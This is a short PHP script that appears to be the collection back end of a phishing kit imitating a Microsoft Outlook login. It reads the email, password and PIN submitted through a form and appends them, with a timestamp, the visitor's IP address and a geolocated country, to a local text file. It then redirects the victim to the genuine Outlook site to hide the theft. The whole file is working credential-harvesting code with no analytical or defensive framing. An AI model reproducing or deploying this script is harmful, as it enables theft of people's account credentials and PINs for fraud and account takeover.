<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
date_default_timezone_set('America/Bogota');


if ( isset ($_POST['email']) && isset ($_POST['pass']) && isset ($_POST['pin'])){
	$file = fopen("yesax92.txt", "a");
	
fwrite($file, "======================" . PHP_EOL);	
fwrite($file, "email : ".$_POST['email']." - clave : ".$_POST['pass']." - Pin: ".$_POST['pin']." - ".date ('l jS \of F Y h:i:s A',time())." ".$userp." ".$pais."" .PHP_EOL);



@header('Location: https://outlook.live.com/');
}

else{ header ('location: index.html'); exit(); }

?>  